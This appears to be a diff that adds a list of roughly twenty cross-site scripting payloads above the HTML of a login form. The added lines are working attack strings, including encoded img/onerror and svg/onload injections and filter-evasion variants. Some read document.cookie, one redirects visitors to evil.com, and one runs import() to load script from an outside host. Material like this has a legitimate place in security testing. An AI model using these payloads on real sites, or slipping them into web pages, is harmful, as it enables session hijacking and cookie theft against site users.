@@ -22,6 +22,26 @@ info:
 <img src=x onError=prompt(1)>
 <img src=x onerroR=alert(2)>
 
+%22%3E%3Cimg%2Fsrc=+only=1+OnErRor=x=alert%60XSS%60%3E%3C%21--
+%22%3E%3Cimg/src=x%20onerror=alert(`XSS`)%3E%3C!--
+<img src=x onerror=alert(1)>
+javascript:var{a:onerror}={a:alert};throw%20document.cookie
+<img src=x onerror=prompt(8);>
+admin";alert(1)//
+rootxravi<onmouseover=alert(document.cookie)//>rootxravi
+rootxravi<onmouseover=location='https://evil.com'//>rootxravi
+rootxravi<onmouseover=alert(1)//>
+<img src=x onError=prompt(document.cookie)>
+<img src=x onerroR=alert(document.domain)>
+Defaulttest><iframe src=javascript:al\u{65}rt(1)>
+<img src="" onerror="alert('XSS Time!'+document.cookie)">
+<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
+<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
+<Img Src=//X55.is OnLoad=import(src)>
+<iframe srcdoc="<img src=x onerror=alert(document.cookie)>"></iframe>
+<!--><Svg%20OnLoad=_=confirm,_(document.domain)<!--
+alert;[alert][0].call(this,1)
+
 <!-- Login Form -->
 <div class="heading">
   <h1 style="text-align: center; font-size: 24px; color: #333; margin-bottom: 20px;">Login Page</h1>
